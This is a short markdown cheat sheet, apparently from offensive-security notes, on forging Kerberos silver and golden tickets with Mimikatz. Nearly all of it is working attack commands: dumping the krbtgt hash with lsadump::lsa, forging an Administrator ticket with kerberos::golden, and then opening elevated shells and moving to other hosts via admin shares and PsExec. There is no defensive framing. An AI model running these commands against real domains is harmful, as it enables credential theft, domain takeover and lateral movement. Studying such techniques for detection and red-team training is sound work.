# Silver & Golden Tickets

[Mimikatz](Mimikatz.md)

- A silver ticket is limited to the targeted service.
- A golden ticket has access to any Kerberos service.

## Golden Tickets

Dump the krbtgt hash

```sh
lsadump::lsa /inject /name:krbtgt
# Make sure this outputs: [privilege '20' ok]
```

Create a golden ticket

```sh
kerberos::golden /user:Administrator /domain:controller.local /sid:{krbtgt_SID} /krbtgt:{krbtgt_NTHASH} /id:500

kerberos::golden /user:Administrator /domain:{DOMAIN} /sid:{SID} /krbtgt:{NTLM} /id:500

# Make sure this outputs: Final Ticket Saved to file !
```

Use the Golden ticket to access other machines

```sh
misc::cmd
# This will open a new command prompt with elevated privileges on all machines


dir \\DESKTOP-1\c$
PsExec.exe \\DESKTOP-1 cmd.exe
```


## Silver Tickets

To create a silver ticket, simply put a service NTLM hash in the krbtgt location, the service account SID in SID, and change the ID to 1103.

Create a golden/silver ticket

```sh
kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:1103
```

Use the Silver ticket to access the service

```sh
misc::cmd
# This will open a new elevated command prompt with the given ticket in mimikatz

dir \\DESKTOP-1\c$
```
